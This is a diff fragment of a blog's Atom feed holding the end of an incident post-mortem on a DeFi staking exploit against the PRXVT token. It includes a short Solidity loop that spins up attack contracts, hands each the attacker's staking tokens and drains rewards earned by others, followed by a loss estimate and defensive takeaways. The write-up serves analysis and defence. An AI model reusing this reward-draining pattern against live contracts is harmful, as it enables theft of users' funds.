+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And the loop that drives it:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; i; i &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 20&lt;&#x2F;span&gt;&lt;span&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    bytes32&lt;&#x2F;span&gt;&lt;span&gt; salt &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(i));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    Attack a1 &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;= new&lt;&#x2F;span&gt;&lt;span&gt; Attack{salt&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; salt}();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;    IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(a1),&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(attacker));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    a1.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Each &lt;code&gt;Attack&lt;&#x2F;code&gt; instance starts with zero reward history, receives stPRXVT, and immediately drains PRXVT rewards that were accrued by others.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;damage&quot;&gt;Damage&lt;&#x2F;h3&gt;
+&lt;p&gt;The exploit contract still holds PRXVT tokens, but since the team pulled the LP, it’s hard to cash them out.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy4.png&quot; alt=&quot;Exploit contract balance and LP pulled&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The final loss is estimated at $97,852.95.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy5.png&quot; alt=&quot;Estimated final loss&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;takeaways&quot;&gt;Takeaways&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Reward accounting must distinguish between staked amounts (deposited via &lt;code&gt;stake&lt;&#x2F;code&gt;) and arbitrary transfers. Transferable staking tokens should not auto-accrue rewards without a staking event.&lt;&#x2F;li&gt;
+&lt;li&gt;Using a non-transferable receipt token or blocking transfers to non-staking addresses would have prevented this vector.&lt;&#x2F;li&gt;
+&lt;li&gt;Add invariant tests: “Receiving staking tokens via &lt;code&gt;transfer&lt;&#x2F;code&gt; must not increase &lt;code&gt;earned()&lt;&#x2F;code&gt; or allow &lt;code&gt;claimReward()&lt;&#x2F;code&gt; to succeed.”&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+</feed>
